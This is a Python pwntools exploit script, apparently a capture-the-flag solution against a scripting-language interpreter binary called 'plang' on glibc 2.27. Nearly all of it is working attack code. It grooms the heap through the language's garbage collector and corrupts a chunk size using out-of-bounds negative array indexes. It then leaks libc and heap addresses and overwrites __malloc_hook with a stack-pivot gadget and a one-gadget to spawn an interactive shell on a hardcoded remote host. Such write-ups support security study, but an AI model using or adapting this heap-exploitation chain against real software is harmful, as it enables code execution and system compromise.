from pwn import *
from Crypto.Cipher import AES
import struct
g_local=True
context.log_level='debug'
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
UNSORTED_OFF = 0x3ebca0
if g_local:
	sh = process('./plang')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("111.186.63.201", 10001)

def qword_to_double(qword):
	return "%.650f" % (struct.unpack('<d', struct.pack('<Q', qword)))

sh.recvuntil("> ")
exp1 = '''var x = "11111111111111111111111111111111"
var i = 0 while (i < 7) {x = x + x i = i + 1 System.gc()}
var j = 0 var ba = [] while (j < 0x100) { ba.add(1) j = j + 1 System.gc()}
var bec = [1,2,3,4,5,6,7,8]
var bed = [1,2,3,4,5,6,7,8]
bec = 0
bed = 0
System.gc()'''
exp2 = '''x = x + x System.gc()
j = 0 var bb = [] while (j < 0x400) { bb.add(2) j = j + 1 System.gc()}
System.gc()'''

def send_payload(payloads, leak = False):
	for p in payloads:
		sh.sendline(p)
		if leak:
			ret = sh.recvuntil('\n')
		else:
			ret = None
		sh.recvuntil("> ")
	return ('\x00' if len(ret) == 1 else ret[0]) if ret else None

send_payload(exp1.split('\n'))

#try to remove a chunk from bins, 
#otherwise `prev_size != size` will occur for that chunk 
send_payload([
	"j = 0 var bea = [] while (j < 0x10) { bea.add(0x1000) j = j + 1 System.gc()}",
	"j = 0 var beb = \"%s\"" % ('A' * 0x70)])#consume a bin
#now heap:
#1. string x '111'
#2. ba

#payloads = []
#for i in xrange(4):
#	payloads.append("j = 0 var be%s = [1,2,3,4]" % chr(ord('a') + i))
#too many fragments :(
send_payload(["j = 0 var baa = [] while (j < 0x80) { baa.add(1) j = j + 1 System.gc()}"])
send_payload(exp2.split('\n'))
#now heap allocation:
#1. ba -> try to change chunk size for this one 
#2. baa 0x55555578b650
#3. x 
#4. bb

#send_payload(["j = 0 var bf = [] while (j < 0x80) { bf.add(0x2000) j = j + 1 System.gc()}",
#	"j = 0 var bg = [] while (j < 0x80) { bg.add(0x2000) j = j + 1 System.gc()}", # padding
#	"bf=0", "System.gc()"]) #prepare some chunk for `bc` to use when `bc` does not reach 0x100

send_payload(["bb[%d]=%s" % (-0x386, qword_to_double(0x1010+0x810+0x2030+1)), #change chunk size of `ba`
	"ba = 0","System.gc()"]) # free(ba) 0x55555578a640

send_payload(["j = 0 var bc = [] while (j < 0x100) { bc.add(2019) j = j + 1 System.gc()}"])
send_payload(["j = 0 var bca = [] while (j < 0x101) { bca.add(2019) j = j + 1 System.gc()}"])
#//0x55005578a5b8 where does this fucking \x00 come from
#now heap address and libc address have been shoot to x 0x7b0
#send_payload(["bca = 0", "System.gc()"])
# x/4gx 0x55555578a620
# 0x55555578a620:	0x0000000000000800	0x0000000000003871
# 0x55555578a630:	0x00007ffff7a31ca0	0x0000555555788f20


leak = ""
for i in xrange(0x7b0,0x7b8):
	leak += send_payload(["System.print(x[%d])" % i], True)
	send_payload(["System.gc()"])
libc_addr = u64(leak) - 0x3ebca0

leak = ""
for i in xrange(0x7c0,0x7c8):
	leak += send_payload(["System.print(x[%d])" % i], True)
	send_payload(["System.gc()"])
heap_addr = u64(leak)

print hex(libc_addr),hex(heap_addr)

send_payload(["bb[%d]=%s" % (-0x1ae4, qword_to_double(libc_addr + e.symbols["__malloc_hook"] - 0x20))])
payload = "var s2 = [%s,2,3,1]" % qword_to_double(libc_addr + 0x162ea3)
#0x162ea3 : add rsp, 0x520 ; pop rbx ; ret
assert len(payload) < 0x2b0
payload = payload.ljust(0x2b0, '\x00')
payload += p64(libc_addr + 0x4f322)
payload += '\x00' * 0x60
send_payload(["var s1 = [1,2,3,4]"])
sh.sendline(payload)

# send_payload(["j = 0 var sh = [] while (j < 4) { sh.add(0x2019) j = j + 1 System.gc()}", "var tmp = 0x2019"])
# send_payload(["sh.add(tmp)"])
# send_payload(["j = 0 var sh2 = [] while (j < 4) { sh2.add(0x2019) j = j + 1 System.gc()}"])
# send_payload(["sh2.add(tmp)"])
# send_payload(["j = 0 var sh3 = [] while (j < 0x81) { sh3.add(0x2019) j = j + 1 System.gc()}"])
# send_payload(["j = 0 var sh4 = [] while (j < 4) { sh4.add(0x2019) j = j + 1 System.gc()}"])
# send_payload(["sh4.add(tmp)"])
#realloc function will not take stuff from tcache!!!

sh.interactive()
#send_payload(["ba[%d]=%s" % ((-14692368/0x10)+2, qword_to_double(0x7fefffffc39c9dc5))])